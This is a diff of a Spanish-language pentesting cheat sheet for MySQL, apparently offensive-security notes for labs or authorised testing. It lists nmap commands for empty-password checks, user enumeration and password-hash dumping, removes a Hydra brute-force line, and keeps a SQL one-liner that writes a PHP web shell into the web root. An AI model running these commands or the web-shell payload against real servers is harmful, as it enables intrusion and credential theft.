@@ -1,51 +1,25 @@
-## Check Empty Password
+# MySQL
+Servicio de bases de datos SQL usualmente en el puerto 3306
+## Enumeración
+### Check Empty Password
 ```nmap
 nmap --script=mysql-empty-password -p 3306 IP
 ```	
-## Enumeración de usuarios
-### Nmap
+## Interacción con el servidor
+### Enumeración de usuarios mediante nmap (Authenticated)
 ```
 nmap --script=mysql-users --script-args="mysqluser='VALIDUSER',mysqlpass='VALIDPASS'" -p 3306 IP
 ```	
-## Login Bruteforce
-### Metasploit 
-```
-use auxiliary/scanner/mysql/mysql_login
-```
-### Hydra
-```
-hydra -L USERLIST  -P PASSLIST IP mysql
-```
-
-## Ver database schema
-### Nmap
+### Obtención del database schema usando nmap (Authenticated)
 ```
 nmap --script=mysql-databases --script-args="mysqluser='VALIDUSER',mysqlpass='VALIDPASS'" -p 3306 IP
 ```
-### Metasploit 
-```
-auxiliary/scanner/mysql/mysql_schemadump
-```
-## POST
-### Hashdump
-#### Metasploit
-```
-auxiliary/scanner/mysql/mysql_hashdump
-```
-#### Nmap Script
+### Obtención de hashes usando nmap (Authenticated)
 ```
 nmap --script mysql-dump-hashes --script-args="mysqluser='VALIDUSER',mysqlpass='VALIDPASS'" -p 3306 IP
 ```		
-### Writable directories list
-```
-auxiliary/scanner/mysql/mysql_writable_dirs
-```
-### Readable files list
-```
-auxiliary/scanner/mysql/mysql_file_enum
-```
-
-### SQL TO WEB SHELL
+## Vulnerabilidades comunes sin metasploit
+### Pasar de SQL a una  webshell
 ```SQL
 SELECT '<?php echo passthru($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
 ```
